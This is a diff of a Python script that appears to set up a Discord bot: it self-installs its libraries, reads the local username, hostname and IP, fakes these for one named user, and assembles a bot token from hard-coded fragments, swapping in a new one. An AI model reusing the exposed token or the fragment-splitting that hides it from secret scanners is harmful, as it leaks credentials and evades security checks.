@@ -1,14 +1,26 @@
-import discord
-from discord.ext import commands
-from discord_slash import SlashCommand
-from discord_slash.utils.manage_commands import create_option
-from discord.ext import commands
 import time
 import os
 import socket
 import pickle
 import json
 import random
+
+
+try:
+	import discord
+except:
+	os.system("py -m pip install discord.py")
+finally:
+	import discord
+	from discord.ext import commands
+
+try:
+	from discord_slash import SlashCommand
+except:
+	os.system("py -m pip install discord-py-slash-command")
+finally:
+	from discord_slash import SlashCommand
+	from discord_slash.utils.manage_commands import create_option
 
 
 pcuser=os.environ['username']
@@ -18,13 +30,13 @@ IPA=socket.gethostbyname(hostname)
 projects = ["kopier.py", "liv.py"]
 if pcuser=="PVER":
 	hostname="Linux_Kali_Vmw4GB"
-	IPA=f"192.{random.choice([69, 420])}.{random.randrange(1, 98, 1)}.{random.randrange(1, 98, 1)}"
+	IPA=f"192.{random.randrange(69, 420, 1)}.{random.randrange(1, 98, 1)}.{random.randrange(1, 98, 1)}"
 	projects=[]
 
 TOKEN = ''
 parts={'p1':'ODcyNDY2NDA5MjQwODAxMzQx',
-'p2':'GMHpNU',
-'p3':'8lcaQgakiOyO5-wKx2Zv1wsJmKaODSbAnCnn4E'}
+'p2':'Ghh1tm',
+'p3':'Y18ul1Ho2hSHrNbNISUr5dw-D6e8nltV5qHMRs'}
 for x in parts:
 	TOKEN=TOKEN+parts[x]+'.'
 TOKEN=TOKEN[:-1]
